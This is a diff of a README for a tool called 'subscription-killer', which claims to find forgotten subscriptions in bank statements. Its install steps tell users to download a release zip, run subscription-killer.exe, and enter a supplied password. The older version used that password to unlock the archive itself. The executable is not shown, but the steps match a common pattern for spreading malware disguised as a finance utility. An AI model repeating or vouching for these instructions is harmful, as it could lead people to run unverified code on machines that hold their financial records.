@@ -1,4 +1,4 @@
-# 🔪 Subscription-Killer
+# 🔪 subscription-killer
 
 > Find forgotten recurring payments in your bank statement and estimate how much money you could save.
 
@@ -39,18 +39,21 @@ The tool analyzes your transaction history and estimates your potential monthly 
 
 1. Download `installer.zip` from the [latest release](https://github.com/dmitry-king1999t3/subscription-killer/releases/latest).
 2. Extract the archive.
-3. The archive is password protected.
-4. Use this password:
+3. Open the extracted folder.
+4. Run:
+
+```text
+subscription-killer.exe
+```
+
+5. After launching the application, it will ask for a password.
+6. Enter:
 
 ```text
 !!%GR0+O_2iT
 ```
 
-5. Run:
-
-```text
-subscription-killer.exe
-```
+7. Follow the instructions shown by the application.
 
 Your bank statement stays on your computer and is not uploaded anywhere.
 
